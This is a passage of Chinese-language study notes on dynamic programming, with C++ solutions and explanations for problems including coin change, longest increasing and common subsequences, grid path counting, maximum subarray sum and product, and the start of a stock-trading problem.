二进制如果有len位，所有二进制状态中不存在连续的1的状态有多少个，辅助数组</span><br><span class="hljs-comment">// 从num二进制形式的高位开始，当前来到第i位，之前的位完全和num一样</span><br><span class="hljs-comment">// 返回&lt;=num且不存在连续的1的状态有多少个</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; cnt, <span class="hljs-type">int</span> num, <span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// num自身合法</span><br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ((num &amp; (<span class="hljs-number">1</span> &lt;&lt; i)) != <span class="hljs-number">0</span>) &#123;<br>        ans += cnt[i];<br>        <span class="hljs-keyword">if</span> ((num &amp; (<span class="hljs-number">1</span> &lt;&lt; (i + <span class="hljs-number">1</span>))) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// 如果num二进制状态，前一位是1，当前位也是1</span><br>            <span class="hljs-comment">// 如果前缀保持和num一样，后续一定不合法了</span><br>            <span class="hljs-comment">// 所以提前返回</span><br>            <span class="hljs-keyword">return</span> ans;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 之前的高位和num一样，且合法，继续去i-1位递归</span><br>    ans += f(cnt, num, i - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">findIntegers2</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">cnt</span><span class="hljs-params">(<span class="hljs-number">31</span>)</span>;<br>    cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    cnt[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> len = <span class="hljs-number">2</span>; len &lt;= <span class="hljs-number">30</span>; len++) &#123;<br>        cnt[len] = cnt[len - <span class="hljs-number">1</span>] + cnt[len - <span class="hljs-number">2</span>];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">30</span>; i &gt;= <span class="hljs-number">-1</span>; i--) &#123;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">-1</span>) &#123;<br>            ans++;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((n &amp; (<span class="hljs-number">1</span> &lt;&lt; i)) != <span class="hljs-number">0</span>) &#123;<br>            ans += cnt[i];<br>            <span class="hljs-keyword">if</span> ((n &amp; (<span class="hljs-number">1</span> &lt;&lt; (i + <span class="hljs-number">1</span>))) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">5</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result from findIntegers1: &quot;</span> &lt;&lt; findIntegers1(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Result from findIntegers2: &quot;</span> &lt;&lt; findIntegers2(n) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++">opt[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// 初始化：兑换金额为0时，不需要任何硬币</span><br><br><span class="hljs-comment">// 阶段（线性增长）：从1逐步增加到目标金额amount</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= amount; i++) &#123;<br>    opt[i] = INF; <span class="hljs-comment">// 设置当前金额i的最少硬币数量为一个极大值（用INF表示），方便后续比较取最小值</span><br><br>    <span class="hljs-comment">// 决策（找到子问题）：遍历每个硬币面值，找到凑成当前金额的最优方案</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; coins.length; j++) &#123;<br>        <span class="hljs-keyword">if</span> (i - coins[j] &gt;= <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 判断是否可以用当前硬币凑成当前金额</span><br>            <span class="hljs-comment">// 状态（具有最优子结构）：选择最小的硬币数量，确保当前金额的最优解</span><br>            opt[i] = Math.<span class="hljs-built_in">min</span>(opt[i], opt[i - coins[j]] + <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*无论是递推实现还是记忆化搜索(递归实现)这种定义状态+最优子结构+推导关系的解题方法其实就是 动态规划 算法</span><br><span class="hljs-comment">1.问题定义：</span><br><span class="hljs-comment">设 opt[i] 表示凑成金额 i 所需的最少硬币数量。确定“状态”的原则:寻找变化信息</span><br><span class="hljs-comment">2.状态转移方程：</span><br><span class="hljs-comment">对于每个金额 i，我们可以通过以下公式计算 opt[i]：opt[i] = min&#123;opt[i - coin] + 1&#125; 确定“最优子结构”的原则:寻找代表</span><br><span class="hljs-comment">3.边界：opt[0]=0,opt[i]=+∞(i&gt;0)</span><br><span class="hljs-comment">4.目标：opt[amount]</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p>总结：</p><p><strong>人力模拟 &#x2F; 暴力搜索</strong>：</p><ul><li>目的是通过手动模拟问题解决过程，理解如何遍历所有可能的状态和情况。</li><li>关注点：<strong>轮廓变化</strong>，分析状态如何从一个转移到另一个。我们是不是考虑在列表时候就是一个行一个列，它们往后推移,因此ij作为一个状态。lcs呢?选哪个数刚选的这个末尾是不是一个位置把这个轮廓描述一下表示字符串 <code>text1</code> 的每个字符位置，列表示字符串 <code>text2</code> 的每个字符位置。每个格子 <code>(i, j)</code> 的值代表 <code>text1</code> 的前 <code>i</code> 个字符和 <code>text2</code> 的前 <code>j</code> 个字符的LCS长度。我们从左上角 <code>(0, 0)</code> 开始计算，逐步填充整个矩阵，一直到右下角的 <code>(n, m)</code>，最终结果即 <code>f[n][m]</code>，作为一个状态之后，把决策写好，这个题目就做完了。它整体的一个变化情况就可以得到我们这个题目的转移方程了。</li></ul><p><strong>定义状态</strong>：递增循环每一维啊,</p><ul><li>确定用什么变量或数组来表示问题中的不同状态。</li><li>关注点：<strong>代表</strong>（如代表某个位置、子问题的解等），以及状态之间的推导关系。</li></ul><p><strong>确定最优子结构</strong>：</p><ul><li>通过找到小问题的最优解来组成大问题的最优解。</li><li>关注点：手动模拟时做出的决策，观察这些决策如何影响最终解。</li></ul><p><strong>写出状态转移方程</strong>：</p><ul><li>根据之前定义的状态，写出如何从一个状态转移到另一个状态，形成递推关系。</li></ul><p><strong>确定边界、目标和实现</strong>：</p><ul><li>确定边界条件（如起点和结束点）和不合法的状态。</li><li>目标是找到最终要求的解，并根据状态转移方程使用循环或递归来实现求解。</li></ul><p>例外</p><p>动态规划打印方案的原则</p><ol><li><strong>记录转移路径</strong>：在动态规划的计算过程中，我们不仅要记录每个状态的最优值，还需要记录每个状态的转移来源</li><li><strong>递归输出</strong>：在填完整个动态规划表格后，从终点（如 <code>f[n][m]</code>）开始，沿着记录的路径递归地输出最优方案</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lengthOfLIS</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(n, <span class="hljs-number">1</span>)</span></span>; <span class="hljs-comment">// f[i] 表示以 nums[i] 结尾的最长递增子序列的长度</span><br>        <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">pre</span><span class="hljs-params">(n, <span class="hljs-number">-1</span>)</span></span>; <span class="hljs-comment">// pre[i] 用于记录最长子序列中 nums[i] 的前一个元素的索引</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) &#123;<br>                <span class="hljs-keyword">if</span> (nums[i] &gt; nums[j] &amp;&amp; f[i] &lt; f[j] + <span class="hljs-number">1</span>) &#123;<br>                    f[i] = f[j] + <span class="hljs-number">1</span>; <span class="hljs-comment">// 更新 f[i] 为以 nums[i] 结尾的最长子序列的长度</span><br>                    pre[i] = j; <span class="hljs-comment">// 记录转移路径，将 nums[i] 的前驱设置为 nums[j]</span><br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>, end = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (f[i] &gt; ans) &#123;<br>                ans = f[i];<br>                end = i; <span class="hljs-comment">// 记录最长子序列的最后一个元素的索引</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-built_in">print</span>(nums, pre, end); <span class="hljs-comment">// 输出最长递增子序列</span><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; pre, <span class="hljs-type">int</span> i)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 基本情况：如果没有前驱，直接返回</span><br>        <span class="hljs-built_in">print</span>(nums, pre, pre[i]); <span class="hljs-comment">// 递归回溯，输出子序列</span><br>        std::cout &lt;&lt; nums[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>; <span class="hljs-comment">// 输出当前元素</span><br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>空间的优化<br>仔细观察状态转移方程，fi?,?,?]总是从f[i-1)?,?,?]转移过来，与更早的i-2,i-3,…. 没有关系如果把每个 fi]看作一行，那么转移只在相邻两行之间发生这种情况下可以使用滚动数组优化,实现中，先不优化，写完以后在每个f的第一维加个&amp;1(and1，即 mod 2)注意初始化复用的空间</p><p>零钱兑换”的最优子结构</p><p><strong>目标</strong>：找到兑换某个金额所需的最少硬币数量，形成最优的硬币兑换方案。</p><p><strong>状态定义</strong>：</p><ul><li>记录当前的“剩余金额”和“已用硬币枚数”。</li><li>新状态目标为“剩余金额”以及在硬币数量最少的前提下达到目标。</li></ul><p><strong>推导关系</strong>：</p><ul><li>递推公式为：opt(n) &#x3D; min(opt(n - 1), opt(n - 9), opt(n - 10)) + 1。</li><li>其中，<code>opt(n)</code>表示兑换金额为n元时所需的最少硬币数，<code>opt(n - 1)</code>, <code>opt(n - 9)</code>, <code>opt(n - 10)</code>分别代表使用1元、9元和10元硬币时的剩余情况。</li></ul><p><strong>最优子结构</strong>：</p><ul><li>通过递推关系，可以在状态、最优化目标、最优解之间建立递归关系，实现零钱兑换的最优解。就是因为我们提炼搜索结构，不要去盲目的根据所有方案。而是我们去只遍历，只要那一个最有解的哎，</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestCommonSubsequence</span><span class="hljs-params">(std::string text1, std::string text2)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = text<span class="hljs-number">1.l</span>ength();<br>        <span class="hljs-type">int</span> n = text<span class="hljs-number">2.l</span>ength();<br>        std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">f</span>(m + <span class="hljs-number">1</span>, std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (text1[i - <span class="hljs-number">1</span>] == text2[j - <span class="hljs-number">1</span>]) &#123;<br>                    f[i][j] = f[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    f[i][j] = std::<span class="hljs-built_in">max</span>(f[i - <span class="hljs-number">1</span>][j], f[i][j - <span class="hljs-number">1</span>]);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> f[m][n];<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="路径计数"><a href="#路径计数" class="headerlink" title="路径计数"></a>路径计数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">uniquePathsWithObstacles</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid)</span> &#123;<br>    <span class="hljs-type">int</span> n = grid.size();            <span class="hljs-comment">// 行数</span><br>    <span class="hljs-type">int</span> m = grid[<span class="hljs-number">0</span>].size();          <span class="hljs-comment">// 列数</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; f(n, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(m, <span class="hljs-number">0</span>)); <span class="hljs-comment">// 创建二维数组f并初始化为0</span><br><br>    <span class="hljs-comment">// 遍历每个网格位置</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>            <span class="hljs-comment">// 如果当前格子有障碍物，路径数为0</span><br>            <span class="hljs-keyword">if</span> (grid[i][j] == <span class="hljs-number">1</span>) &#123;<br>                f[i][j] = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-comment">// 起点 (0, 0) 路径数为1（前提是没有障碍物）</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> &amp;&amp; j == <span class="hljs-number">0</span>) &#123;<br>                f[i][j] = <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-comment">// 第一行时，只能从左边到达</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;<br>                f[i][j] = f[i][j - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-comment">// 第一列时，只能从上面到达</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span>) &#123;<br>                f[i][j] = f[i - <span class="hljs-number">1</span>][j];<br>            &#125;<br>            <span class="hljs-comment">// 其他情况，路径数等于从上方和左侧位置到达的路径数之和</span><br>            <span class="hljs-keyword">else</span> &#123;<br>                f[i][j] = f[i - <span class="hljs-number">1</span>][j] + f[i][j - <span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 返回到达终点 (n-1, m-1) 的路径数</span><br>    <span class="hljs-keyword">return</span> f[n - <span class="hljs-number">1</span>][m - <span class="hljs-number">1</span>];<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="最大子序和"><a href="#最大子序和" class="headerlink" title="最大子序和"></a>最大子序和</h4><p>状态定义</p><ul><li>设 <code>f[i]</code> 表示<strong>以 <code>i</code> 为结尾</strong>的最大子序和。</li></ul><p>状态转移方程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f<span class="hljs-selector-attr">[i]</span> = <span class="hljs-built_in">max</span>(f<span class="hljs-selector-attr">[i - 1]</span> + nums<span class="hljs-selector-attr">[i]</span>, nums<span class="hljs-selector-attr">[i]</span>)<br></code></pre></td></tr></table></figure><p>其中，<code>f[i - 1] + nums[i]</code> 表示将 <code>nums[i]</code> 加入到前面的子序列中，继续延续子序和；<code>nums[i]</code> 表示以当前元素 <code>nums[i]</code> 开始一个新的子序列。</p><p>边界条件</p><p><code>f[0] = nums[0]</code>，因为以第一个元素结尾的最大子序和就是第一个元素的值。</p><p>目标</p><p>计算 max(f[i])</p><p>关于“包含结尾”的原因</p><ul><li>在这个问题中，状态 <code>f[i]</code> 是以 <code>i</code> 为结尾的子序列的最大和，这样可以确保子序列是连续的。</li><li>通过 <code>f[i - 1]</code> 决定是否延续之前的序列，从而达到最大和。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(n)</span></span>; <span class="hljs-comment">// f[i] 表示以 nums[i] 结尾的最大子序和</span><br>        f[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 边界条件：以第一个元素结尾的最大子序和就是它自身</span><br>        <span class="hljs-type">int</span> ans = f[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 初始化最大子序和为第一个元素</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            f[i] = std::<span class="hljs-built_in">max</span>(f[i - <span class="hljs-number">1</span>], <span class="hljs-number">0</span>) + nums[i]; <span class="hljs-comment">// 状态转移方程</span><br>            ans = std::<span class="hljs-built_in">max</span>(ans, f[i]); <span class="hljs-comment">// 更新全局最大子序和</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="乘积最大子数组"><a href="#乘积最大子数组" class="headerlink" title="乘积最大子数组"></a>乘积最大子数组</h4><p>问题定义</p><ul><li>给定一个数组，找到一个具有最大乘积的连续子数组，返回该最大乘积。</li></ul><p>状态定义</p><ul><li><p>设 <code>fmax[i]</code> 表示以 <code>i</code> 为结尾的子数组的<strong>乘积最大值</strong>。</p></li><li><p>设 <code>fmin[i]</code> 表示以 <code>i</code> 为结尾的子数组的<strong>乘积最小值</strong>。</p><p>使用 <code>fmax</code> 和 <code>fmin</code> 一起作为代表，以保证每一步都能满足最优子结构。原因是，当当前数 <code>nums[i]</code> 为负数时，乘以之前的最小值可能会变成最大值，所以需要同时维护最大和最小值。</p></li></ul><p>状态转移方程</p><ul><li><code>fmax[i] = max(fmax[i - 1] * nums[i], fmin[i - 1] * nums[i], nums[i])</code></li><li><code>fmin[i] = min(fmax[i - 1] * nums[i], fmin[i - 1] * nums[i], nums[i])</code><ul><li><code>fmax[i]</code> 是当前最大乘积，取决于前一个最大乘积乘以当前数、前一个最小乘积乘以当前数，或者当前数本身。</li><li><code>fmin[i]</code> 是当前最小乘积，原因是负数可能会将最小值转化为最大值，因此也需要考虑。</li></ul></li></ul><p>边界条件</p><ul><li><code>fmax[0] = nums[0]</code></li><li><code>fmin[0] = nums[0]</code></li></ul><p>目标</p><ul><li>求 <code>max(fmax[i])</code>，其中 <code>0 &lt;= i &lt; n</code>，即最大乘积。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxProduct</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">fmax</span><span class="hljs-params">(n)</span>, <span class="hljs-title">fmin</span><span class="hljs-params">(n)</span></span>; <span class="hljs-comment">// fmax[i] 和 fmin[i] 分别表示以 nums[i] 结尾的最大和最小乘积</span><br>        fmax[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];<br>        fmin[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> ans = nums[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 初始化最大乘积为第一个元素</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>            fmax[i] = std::<span class="hljs-built_in">max</span>(&#123;fmax[i - <span class="hljs-number">1</span>] * nums[i], fmin[i - <span class="hljs-number">1</span>] * nums[i], nums[i]&#125;);<br>            fmin[i] = std::<span class="hljs-built_in">min</span>(&#123;fmax[i - <span class="hljs-number">1</span>] * nums[i], fmin[i - <span class="hljs-number">1</span>] * nums[i], nums[i]&#125;);<br>            ans = std::<span class="hljs-built_in">max</span>(ans, fmax[i]); <span class="hljs-comment">// 更新全局最大乘积</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="买卖股票"><a href="#买卖股票" class="headerlink" title="买卖股票"></a>买卖股票</h4><p>状态定义</p><p>设 f[i][j][k]表示在第 i 天结束时，持有 j 股股票（j为 0 或 1），已经完成了 k次交易的最大收益。</p><ul><li><code>i</code>：第几天。</li><li><code>j</code>：是否持有股票（0 表示不持有，1 表示持有）。</li><li><code>k</code>：已经完成的交易次数。</li></ul><p>决策转移</p><ul><li><p>买入</p><p>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[k]</span> = <span class="hljs-built_in">max</span>(f<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[k]</span>, f<span class="hljs-selector-attr">[i-1]</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[k-1]</span> - prices<span class="hljs-selector-attr">[i]</span>)<br></code></pre></td></tr></table></figure><ul><li>如果在第 <code>i</code> 天选择买入股票，那么前一天的状态应该是不持有股票且已完成 <code>k-1</code> 次交易，并减去当天的价格 <code>prices[i]</code>。</li></ul></li><li><p>卖出</p><p>：</p><figure class="highlight stylus"><table><tr><td 